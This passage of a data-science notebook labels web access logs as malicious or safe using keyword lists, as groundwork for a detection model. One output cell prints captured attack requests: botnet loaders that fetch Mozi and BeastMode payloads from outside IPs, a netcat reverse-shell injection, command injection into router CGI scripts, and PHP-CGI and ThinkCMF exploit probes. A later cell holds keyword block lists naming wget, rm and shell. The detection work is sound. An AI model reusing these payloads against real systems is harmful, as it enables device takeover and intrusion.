        "## 2.3 Explore requests"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ySxcXftAqbka",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "5b8fab7d-c57d-4270-ebd1-330b5560d3a3"
      },
      "source": [
        "dft.request[1000:1200].values"
      ],
      "execution_count": 192,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array(['/sql/myadmin/index.php?lang=en',\n",
              "       '/sql/webadmin/index.php?lang=en', '/sql/sqlweb/index.php?lang=en',\n",
              "       '/sql/websql/index.php?lang=en', '/sql/webdb/index.php?lang=en',\n",
              "       '/sql/sqladmin/index.php?lang=en',\n",
              "       '/sql/sql-admin/index.php?lang=en',\n",
              "       '/sql/phpmyadmin2/index.php?lang=en',\n",
              "       '/sql/phpMyAdmin2/index.php?lang=en',\n",
              "       '/sql/phpMyAdmin/index.php?lang=en',\n",
              "       '/db/myadmin/index.php?lang=en', '/db/webadmin/index.php?lang=en',\n",
              "       '/db/dbweb/index.php?lang=en', '/db/websql/index.php?lang=en',\n",
              "       '/db/webdb/index.php?lang=en', '/db/dbadmin/index.php?lang=en',\n",
              "       '/db/db-admin/index.php?lang=en',\n",
              "       '/db/phpmyadmin3/index.php?lang=en',\n",
              "       '/db/phpMyAdmin3/index.php?lang=en',\n",
              "       '/db/phpMyAdmin-3/index.php?lang=en',\n",
              "       '/administrator/phpmyadmin/index.php?lang=en',\n",
              "       '/administrator/phpMyAdmin/index.php?lang=en',\n",
              "       '/administrator/db/index.php?lang=en',\n",
              "       '/administrator/web/index.php?lang=en',\n",
              "       '/administrator/pma/index.php?lang=en',\n",
              "       '/administrator/PMA/index.php?lang=en',\n",
              "       '/administrator/admin/index.php?lang=en',\n",
              "       '/phpMyAdmin2/index.php?lang=en', '/phpMyAdmin3/index.php?lang=en',\n",
              "       '/phpMyAdmin4/index.php?lang=en',\n",
              "       '/phpMyAdmin-3/index.php?lang=en',\n",
              "       '/php-my-admin/index.php?lang=en', '/PMA2011/index.php?lang=en',\n",
              "       '/PMA2012/index.php?lang=en', '/PMA2013/index.php?lang=en',\n",
              "       '/PMA2014/index.php?lang=en', '/PMA2015/index.php?lang=en',\n",
              "       '/PMA2016/index.php?lang=en', '/PMA2017/index.php?lang=en',\n",
              "       '/PMA2018/index.php?lang=en', '/PMA2019/index.php?lang=en',\n",
              "       '/PMA2020/index.php?lang=en', '/pma2011/index.php?lang=en',\n",
              "       '/pma2012/index.php?lang=en', '/pma2013/index.php?lang=en',\n",
              "       '/pma2014/index.php?lang=en', '/pma2015/index.php?lang=en',\n",
              "       '/pma2016/index.php?lang=en', '/pma2017/index.php?lang=en',\n",
              "       '/pma2018/index.php?lang=en', '/pma2019/index.php?lang=en',\n",
              "       '/pma2020/index.php?lang=en', '/phpmyadmin2011/index.php?lang=en',\n",
              "       '/phpmyadmin2012/index.php?lang=en',\n",
              "       '/phpmyadmin2013/index.php?lang=en',\n",
              "       '/phpmyadmin2014/index.php?lang=en',\n",
              "       '/phpmyadmin2015/index.php?lang=en',\n",
              "       '/phpmyadmin2016/index.php?lang=en',\n",
              "       '/phpmyadmin2017/index.php?lang=en',\n",
              "       '/phpmyadmin2018/index.php?lang=en',\n",
              "       '/phpmyadmin2019/index.php?lang=en',\n",
              "       '/phpmyadmin2020/index.php?lang=en', '/index.php?lang=en',\n",
              "       '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://116.74.137.234:41630/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1',\n",
              "       '/robots.txt',\n",
              "       '/shell?cd+/tmp;rm+-rf+*;wget+http://27.6.247.91:50668/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws',\n",
              "       '/admin//config.php', '/GponForm/diag_Form?images/', '/robots.txt',\n",
              "       '/favicon.ico', '/favicon.ico', '/boaform/admin/formLogin',\n",
              "       '/robots.txt', '/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f',\n",
              "       '/shell?cd+/tmp;rm+-rf+*;wget+http://120.56.118.149:57158/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws',\n",
              "       '/boaform/admin/formLogin', '/TP/public/index.php',\n",
              "       '/TP/index.php', '/thinkphp/html/public/index.php',\n",
              "       '/html/public/index.php', '/public/index.php',\n",
              "       '/TP/html/public/index.php', '/elrekt.php', '/index.php',\n",
              "       '/solr/admin/info/system?wt=json',\n",
              "       '/?XDEBUG_SESSION_START=phpstorm',\n",
              "       '/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>',\n",
              "       '/w00tw00t.at.ISC.SANS.DFind:)', '/hudson', '/robots.txt',\n",
              "       '/w00tw00t.at.ISC.SANS.DFind:)', '/admin//config.php',\n",
              "       'www.spotify.com:443', '/GponForm/diag_Form?images/',\n",
              "       '/robots.txt', 'login.cgi',\n",
              "       '/set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+89.248.166.183+1245+-e+%2Fbin%2Fsh%29',\n",
              "       '/ftptest.cgi?loginuse=&loginpas=', '/sandbox/amo_sms/',\n",
              "       '/api/jsonws/invoke',\n",
              "       '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://60.243.48.141:35921/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1',\n",
              "       '/.env', '/admin//config.php', '/boaform/admin/formLogin',\n",
              "       '/shell?cd+/tmp;rm+-rf+*;wget+149.3.170.181/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws',\n",
              "       '/xmlrpc.php', '/blog/xmlrpc.php', '/wp-login.php',\n",
              "       '/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://185.172.111.196/awGawgf.sh%20-O%2012.awGawgf.sh;curl%20-O%20http://185.172.111.196/awGawgf.sh%20-O%2011.awGawgf.sh;%20chmod%20777%20*;%20sh%2011.awGawgf.sh;%20sh%2012.awGawgf.sh)&password=admin',\n",
              "       '/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://185.172.111.196/awGawgf.sh%20-O%2012.awGawgf.sh;curl%20-O%20http://185.172.111.196/awGawgf.sh%20-O%2011.awGawgf.sh;%20chmod%20777%20*;%20sh%2011.awGawgf.sh;%20sh%2012.awGawgf.sh)&password=admin',\n",
              "       '/admin//config.php', '/portal/redlion',\n",
              "       '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://116.74.135.9:35378/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1',\n",
              "       '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.99.237.101:37481/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1',\n",
              "       'http://5.188.210.227/echo.php', '/blog/', '/wp/', '/wordpress/',\n",
              "       '/new/', '/old/', '/test/', '/main/', '/site/', '/backup/',\n",
              "       '/demo/', '/home/', '/tmp/', '/cms/', '/dev/', '/old-wp/', '/web/',\n",
              "       '/old-site/', '/temp/', '/2018/', '/2019/', '/bk/', '/wp1/',\n",
              "       '/wp2/', '/v1/', '/v2/', '/bak/', '/install/', '/2020/',\n",
              "       '/new-site/',\n",
              "       '/shell?cd+/tmp;rm+-rf+*;wget+149.3.170.181/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws',\n",
              "       '/GponForm/diag_Form?images/', '/robots.txt',\n",
              "       '/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f',\n",
              "       '/shell?cd+/tmp;rm+-rf+*;wget+http://60.243.112.189:44585/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws',\n",
              "       '/boaform/admin/formLogin', '/index.php',\n",
              "       '/w00tw00t.at.ISC.SANS.DFind:)', '/w00tw00t.at.ISC.SANS.DFind:)',\n",
              "       '/solr/admin/info/system?wt=json',\n",
              "       '/?XDEBUG_SESSION_START=phpstorm',\n",
              "       '/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>',\n",
              "       '/api/jsonws/invoke',\n",
              "       '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',\n",
              "       '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',\n",
              "       '/.well-known/security.txt', '/robots.txt',\n",
              "       '/Admin8f84a4c1/Login.php', '/l.php', '/phpinfo.php', '/test.php',\n",
              "       '/index.php', '/bbs.php', '/forum.php', '/forums.php',\n",
              "       '/bbs/index.php', '/forum/index.php', '/forums/index.php',\n",
              "       '/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E',\n",
              "       '/cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E',\n",
              "       '/cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E',\n",
              "       '/cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E',\n",
              "       '/cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E',\n",
              "       '/%62%61%73%65/%70%6F%73%74%2E%70%68%70', '/webdav/',\n",
              "       '/%69%73%70%69%72%69%74/%69%6D/%75%70%6C%6F%61%64%2E%70%68%70',\n",
              "       '/help.php', '/java.php', '/_query.php', '/test.php',\n",
              "       '/db_cts.php', '/db_pma.php', '/logon.php', '/help-e.php',\n",
              "       '/license.php', '/log.php', '/hell.php', '/pmd_online.php',\n",
              "       '/x.php', '/shell.php', '/htdocs.php', '/b.php', '/sane.php',\n",
              "       '/desktop.ini.php', '/z.php', '/lala.php'], dtype=object)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 192
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "gOeUpV_RvaZ_"
      },
      "source": [
        "Potential malitious requests:\n",
        "die, md5, phpunit, .env,"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "K9YU2SnQ-UYn"
      },
      "source": [
        "# 3 Data labeling"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "jsbmSidm-UYn"
      },
      "source": [
        "The source of access logs server is where the Python Flask application runs."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "uIXQ4pxc-UYo"
      },
      "source": [
        "## 3.1 Functions used to filter malicious requests using keywords "
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xfgmrKT1-UYp"
      },
      "source": [
        "def find_bad(tmp_df, phrase):\n",
        "    'Find rows by keyword phrase using regex'\n",
        "    new_df = tmp_df[tmp_df.requests.str.contains(phrase, regex=True, na=False)]\n",
        "    return new_df"
      ],
      "execution_count": 146,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h9znRKE7-UYs"
      },
      "source": [
        "def build_phrase(list):\n",
        "    tmp = ''\n",
        "    for word in list:\n",
        "        if tmp == '': tmp = f'{word}'\n",
        "        else: tmp = f'{tmp}|{word}'\n",
        "    return tmp"
      ],
      "execution_count": 147,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "hChcFTtE-UYx"
      },
      "source": [
        "def get_bad_requests(tmp1_df, keywords):\n",
        "  bad_requests_phrase = build_phrase(keywords)\n",
        "  bad_requests_rows = tmp1_df[tmp1_df.request.str.contains(bad_requests_phrase, regex=True, na=False)]\n",
        "  return bad_requests_rows"
      ],
      "execution_count": 148,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ooyyWJwK-UYw"
      },
      "source": [
        "### 3.1.1 all bad requests"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cx7j1GsDzial"
      },
      "source": [
        "bad_chars = [\n",
        "  '\\.', '\\@', '\\{', '\\}', '\\(', '\\)', '\\+', '\\_', '\\;',\n",
        "]"
      ],
      "execution_count": 25,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "L4qLzSaWzqI5"
      },
      "source": [
        "bad_words = [\n",
        "    'cgi', 'shell', 'die', 'md5', 'phpunit', 'env', 'sh', \n",
        "    'ls', 'cd', 'rm', 'rf', 'wget', 'cmod', 'chown',\n",
        "    'ZINFO', 'fig', 'script', 'php', 'w00t', 'https', 'com',\n",
        "    '%6e', '%6c', '%6d', '%61', '%63','%64', '%65', '%66', '%67', '%68', '%69',\n",
        "    '%7a', '%70', '%72', '%73', '%74', '%75', '%76', '%77', '%78', '%79',\n",
        "]"
      ],
      "execution_count": 149,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "sbnd7-02rjbL"
      },
      "source": [
        "### TODO nuo cia galima viska det i pipeline"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h4kazElHz_tr",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "0c23bb66-caf1-488a-83e6-e5562b8fc18f"
      },
      "source": [
        "bad_char_requests = get_bad_requests(dft, bad_chars)\r\n",
        "bad_char_requests.shape"
      ],
      "execution_count": 27,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(38091, 9)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 27
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "08n7XZxz0IFR",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "480f661b-d9e2-4fef-e716-e236c89ba415"
      },
      "source": [
        "bad_word_requests = get_bad_requests(dft, bad_words)\r\n",
        "bad_word_requests.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(16438, 9)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 34
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "yhgw0SoK-UZl"
      },
      "source": [
        "## 3.2 Good requests"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "UpsG-f_E-UZm"
      },
      "source": [
        "good_char_requests = bad_char_requests.merge(dft, how='outer', indicator=True).loc[lambda x : x['_merge']=='right_only']\n",
        "good_word_requests = bad_word_requests.merge(dft, how='outer', indicator=True).loc[lambda x : x['_merge']=='right_only']"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "98wC5iqZ-UZp",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "1b2f1df1-bc4d-449e-ff60-516aea6a429b"
      },
      "source": [
        "good_char_requests.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(45139, 10)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 69
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "r7TJ8Jc5-UZt",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "e4e30230-396d-49a8-c95f-6f1f21eb5908"
      },
      "source": [
        "good_word_requests.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(66792, 10)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 70
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "XOp8Wb9fGQUa"
      },
      "source": [
        "bad_requests_3 = good_requests.merge(dft, how='outer', indicator=True).loc[lambda x : x['_merge']=='right_only']"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "sWSVdA3x-UZx"
      },
      "source": [
        "# 4 Model"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "gzLcipNS-UZy"
      },
      "source": [
        "## 4.1 Splitting the date (training / validation)"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ppXHrhiZvrDl"
      },
      "source": [
        "dft['is_safe'] = dft.request.isin(good_requests2.request).astype(bool) # should it be bool?"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "OBJDvlaMG3IY"
      },
      "source": [
        "dft['is_safe'] = dft.request.isin(good_requests.request).astype(bool)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "KUcYB6qN0a7p",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "outputId": "f9be8023-4b38-4ca1-d648-814474ab0a7d"
      },
      "source": [
        "dft[450:470]"
      ],
      "execution_count": 114,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>IP</th>\n",
              "      <th>date</th>\n",
              "      <th>full_request</th>\n",
              "      <th>code</th>\n",
              "      <th>bytes</th>\n",
              "      <th>agent</th>\n",
              "      <th>method</th>\n",
              "      <th>request</th>\n",
              "      <th>http_v</th>\n",
              "      <th>is_safe</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>496</th>\n",
              "      <td>159.89.196.206</td>\n",
              "      <td>23/Sep/2020:04:17:14</td>\n",
              "      <td>GET /core/.env HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>python-requests/2.24.0</td>\n",
              "      <td>GET</td>\n",
              "      <td>/core/.env</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>497</th>\n",
              "      <td>159.89.196.206</td>\n",
              "      <td>23/Sep/2020:04:17:16</td>\n",
              "      <td>GET /register?%3Cplay%3Ewithme%3C/%3E HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>python-requests/2.24.0</td>\n",
              "      <td>GET</td>\n",
              "      <td>/register?%3Cplay%3Ewithme%3C/%3E</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>498</th>\n",
              "      <td>159.89.196.206</td>\n",
              "      <td>23/Sep/2020:04:17:18</td>\n",
              "      <td>POST / HTTP/1.1</td>\n",
              "      <td>405</td>\n",
              "      <td>182</td>\n",
              "      <td>python-requests/2.24.0</td>\n",
              "      <td>POST</td>\n",
              "      <td>/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>499</th>\n",
              "      <td>159.89.196.206</td>\n",
              "      <td>23/Sep/2020:04:17:18</td>\n",
              "      <td>POST / HTTP/1.1</td>\n",
              "      <td>405</td>\n",
              "      <td>182</td>\n",
              "      <td>python-requests/2.24.0</td>\n",
              "      <td>POST</td>\n",
              "      <td>/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>500</th>\n",
              "      <td>164.52.24.162</td>\n",
              "      <td>23/Sep/2020:04:18:22</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>13</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:7...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>501</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>23/Sep/2020:04:29:27</td>\n",
              "      <td>GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>396</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/?XDEBUG_SESSION_START=phpstorm</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>502</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>23/Sep/2020:04:47:31</td>\n",
              "      <td>GET /?a=fetch&amp;content=&lt;php&gt;die(@md5(HelloThink...</td>\n",
              "      <td>200</td>\n",
              "      <td>396</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/?a=fetch&amp;content=&lt;php&gt;die(@md5(HelloThinkCMF)...</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>504</th>\n",
              "      <td>187.95.123.122</td>\n",
              "      <td>23/Sep/2020:05:22:42</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>612</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebK...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>505</th>\n",
              "      <td>50.192.43.149</td>\n",
              "      <td>23/Sep/2020:05:41:29</td>\n",
              "      <td>POST /boaform/admin/formPing HTTP/1.1</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>polaris botnet</td>\n",
              "      <td>POST</td>\n",
              "      <td>/boaform/admin/formPing</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>506</th>\n",
              "      <td>94.102.51.119</td>\n",
              "      <td>23/Sep/2020:05:44:39</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>396</td>\n",
              "      <td>Linux Gnu (cow)</td>\n",
              "      <td>GET</td>\n",
              "      <td>/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>508</th>\n",
              "      <td>189.38.179.15</td>\n",
              "      <td>23/Sep/2020:06:19:21</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>612</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>509</th>\n",
              "      <td>193.118.53.202</td>\n",
              "      <td>21/Sep/2020:06:56:38</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>13</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>510</th>\n",
              "      <td>114.67.105.83</td>\n",
              "      <td>21/Sep/2020:07:01:59</td>\n",
              "      <td>GET /TP/public/index.php HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US;...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/TP/public/index.php</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>511</th>\n",
              "      <td>114.67.105.83</td>\n",
              "      <td>21/Sep/2020:07:02:01</td>\n",
              "      <td>GET /TP/index.php HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US;...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/TP/index.php</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>512</th>\n",
              "      <td>114.67.105.83</td>\n",
              "      <td>21/Sep/2020:07:02:01</td>\n",
              "      <td>GET /thinkphp/html/public/index.php HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US;...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/thinkphp/html/public/index.php</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>513</th>\n",
              "      <td>114.67.105.83</td>\n",
              "      <td>21/Sep/2020:07:02:02</td>\n",
